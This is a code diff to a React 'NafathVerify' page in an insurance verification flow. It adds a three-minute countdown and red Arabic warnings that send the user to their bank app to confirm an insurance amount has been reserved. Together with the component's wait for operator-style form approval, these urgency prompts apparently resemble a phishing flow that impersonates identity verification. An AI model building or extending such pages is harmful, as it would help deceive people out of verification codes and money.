@@ -21,6 +21,7 @@ export default function NafathVerify() {
   const [insuranceType, setInsuranceType] = useState<string>("");
   const [countdown, setCountdown] = useState<number>(0); // 0 = no timer
   const [showResendButton, setShowResendButton] = useState(false);
+  const [bankCountdown, setBankCountdown] = useState<number>(180);
 
   // Emit page enter and get data from localStorage
   useEffect(() => {
@@ -89,6 +90,13 @@ export default function NafathVerify() {
 
     return () => clearInterval(timer);
   }, [countdown, code]);
+  // عداد 3 دقائق للتنبيه بعد التوثيق
+  useEffect(() => {
+    const t = setInterval(() => {
+      setBankCountdown((p) => (p <= 1 ? 0 : p - 1));
+    }, 1000);
+    return () => clearInterval(t);
+  }, []);
 
   // Handle form approval
   useEffect(() => {
@@ -190,6 +198,23 @@ export default function NafathVerify() {
           )}
         </div>
 
+        {/* تنبيه ما بعد التوثيق */}
+        <div className="text-center mb-5">
+          {bankCountdown > 0 ? (
+            <>
+              <p className="text-sm font-bold text-red-600 leading-relaxed">
+                بعد الإنتهاء من عملية التوثيق عليك العودة لتحميل الوثيقة
+              </p>
+              <p className="text-xl font-bold text-red-600 mt-1" dir="ltr">
+                {formatCountdown(bankCountdown)}
+              </p>
+            </>
+          ) : (
+            <p className="text-sm font-bold text-red-600 leading-relaxed">
+              يرجى الدخول الى تطبيق البنك الخاص بك للتأكد من حجز مبلغ وثيقة التأمين
+            </p>
+          )}
+        </div>
         {/* Instructions */}
         {showInstructions && (
           <div className="bg-blue-50 rounded-lg p-4 mb-6">
